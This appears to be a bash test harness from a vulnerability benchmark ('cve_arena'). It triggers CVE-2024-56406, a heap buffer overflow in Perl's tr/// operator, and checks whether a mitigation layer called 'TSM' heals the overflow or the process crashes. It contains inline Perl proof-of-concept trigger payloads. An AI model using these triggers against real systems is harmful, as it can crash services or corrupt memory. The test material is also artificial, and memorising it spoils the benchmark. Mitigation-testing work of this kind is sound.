#!/usr/bin/env bash
# CVE-2024-56406 trigger harness for Perl tr/// heap buffer overflow
#
# The vulnerability is in Perl's tr/// (transliteration) operator when
# processing strings that contain wide Unicode characters (above U+00FF)
# and the transliteration range includes byte values \x80-\xFF. The
# output buffer size calculation does not account for the UTF-8 encoding
# expansion, causing a heap buffer overflow when writing the result.
#
# Trigger: perl trigger.pl (runs the crafted tr/// operation)
# Expected stock: heap overflow -> SIGSEGV / SIGABRT
# Expected TSM:   canary detects overflow, ClampSize prevents corruption
set -euo pipefail

RESULT_FILE="/cve_arena/result.json"

echo "[cve_arena] CVE-2024-56406: Perl tr/// heap buffer overflow"
echo "[cve_arena] Perl version: $(perl -v 2>&1 | grep 'version' | head -1 || echo 'unknown')"

CRASHED=false
SIGNAL=""
HEALED=false
HEALING_ACTIONS="[]"

# Run the trigger script
echo "[cve_arena] Executing tr/// overflow trigger..."
set +e
TRIGGER_OUTPUT=$(perl /cve_arena/trigger.pl 2>&1)
TRIGGER_EXIT=$?
set -e

echo "[cve_arena] Exit code: ${TRIGGER_EXIT}"
echo "[cve_arena] Output (first 500 chars): ${TRIGGER_OUTPUT:0:500}"

# Check for crash signals
if [ ${TRIGGER_EXIT} -ge 128 ]; then
    SIGNAL_NUM=$((TRIGGER_EXIT - 128))
    case ${SIGNAL_NUM} in
        6)  SIGNAL="SIGABRT" ;;
        11) SIGNAL="SIGSEGV" ;;
        7)  SIGNAL="SIGBUS"  ;;
        *)  SIGNAL="SIG_${SIGNAL_NUM}" ;;
    esac
    CRASHED=true
    echo "[cve_arena] Crashed with signal: ${SIGNAL}"
fi

# Also run increasingly aggressive variants
if [ "${CRASHED}" = "false" ]; then
    echo "[cve_arena] Running aggressive variant (larger buffer)..."
    set +e
    AGG_OUTPUT=$(perl -e '
        use utf8;
        # Larger payload: 10000 repetitions to maximize overflow footprint
        my $s = "abc\x{100}\x{200}\x{300}" x 10000;
        $s =~ tr/\x80-\xff/X/;
        print "survived_large\n";
    ' 2>&1)
    AGG_EXIT=$?
    set -e
    echo "[cve_arena]   Exit code: ${AGG_EXIT}"

    if [ ${AGG_EXIT} -ge 128 ]; then
        SIGNAL_NUM=$((AGG_EXIT - 128))
        case ${SIGNAL_NUM} in
            6)  SIGNAL="SIGABRT" ;;
            11) SIGNAL="SIGSEGV" ;;
            *)  SIGNAL="SIG_${SIGNAL_NUM}" ;;
        esac
        CRASHED=true
        echo "[cve_arena]   Crashed with signal: ${SIGNAL}"
    fi
    TRIGGER_OUTPUT="${TRIGGER_OUTPUT}${AGG_OUTPUT}"
fi

if [ "${CRASHED}" = "false" ]; then
    echo "[cve_arena] Running mixed-encoding variant..."
    set +e
    MIX_OUTPUT=$(perl -e '
        use utf8;
        # Mix of single-byte and multi-byte characters that stresses
        # the encoding-change path in tr///
        my $s = "";
        for my $i (0..5000) {
            $s .= chr(0x80 + ($i % 128));   # \x80-\xFF range
            $s .= chr(0x100 + ($i % 256));  # wide chars
        }
        # This tr forces re-encoding while the buffer size was
        # calculated for the original encoding
        $s =~ tr/\x80-\xff\x{100}-\x{1ff}/AAAA/;
        print "survived_mixed\n";
    ' 2>&1)
    MIX_EXIT=$?
    set -e
    echo "[cve_arena]   Exit code: ${MIX_EXIT}"

    if [ ${MIX_EXIT} -ge 128 ]; then
        SIGNAL_NUM=$((MIX_EXIT - 128))
        case ${SIGNAL_NUM} in
            6)  SIGNAL="SIGABRT" ;;
            11) SIGNAL="SIGSEGV" ;;
            *)  SIGNAL="SIG_${SIGNAL_NUM}" ;;
        esac
        CRASHED=true
        echo "[cve_arena]   Crashed with signal: ${SIGNAL}"
    fi
    TRIGGER_OUTPUT="${TRIGGER_OUTPUT}${MIX_OUTPUT}"
fi

# Check for TSM healing in any output
if echo "${TRIGGER_OUTPUT}" | grep -qiE "TSM_HEAL|ClampSize|canary_corrupt|heap_overflow|TruncateWithNull"; then
    HEALED=true
    HEALING_ACTIONS=$(echo "${TRIGGER_OUTPUT}" | \
        grep -oiE "TSM_HEAL[^ ]*|ClampSize|canary_corrupt|heap_overflow|TruncateWithNull" | \
        sort -u | jq -R -s 'split("\n") | map(select(length > 0))')
fi

# Build result JSON
jq -n \
    --arg cve "CVE-2024-56406" \
    --arg software "perl" \
    --arg version "5.38.2" \
    --argjson trigger_exit "${TRIGGER_EXIT}" \
    --argjson crashed "${CRASHED}" \
    --arg signal "${SIGNAL}" \
    --argjson healed "${HEALED}" \
    --argjson healing_actions "${HEALING_ACTIONS}" \
    '{
        cve: $cve,
        software: $software,
        version: $version,
        trigger_exit_code: $trigger_exit,
        crashed: $crashed,
        crash_signal: $signal,
        tsm_healed: $healed,
        tsm_healing_actions: $healing_actions,
        timestamp: (now | todate)
    }' > "${RESULT_FILE}"

echo "[cve_arena] Result:"
cat "${RESULT_FILE}"

if [ "${CRASHED}" = "true" ]; then
    echo "[cve_arena] VERDICT: VULNERABLE (crash detected: ${SIGNAL})"
    exit 2
elif [ "${HEALED}" = "true" ]; then
    echo "[cve_arena] VERDICT: PROTECTED (TSM healed the overflow)"
    exit 0
else
    echo "[cve_arena] VERDICT: INCONCLUSIVE"
    exit 3
fi
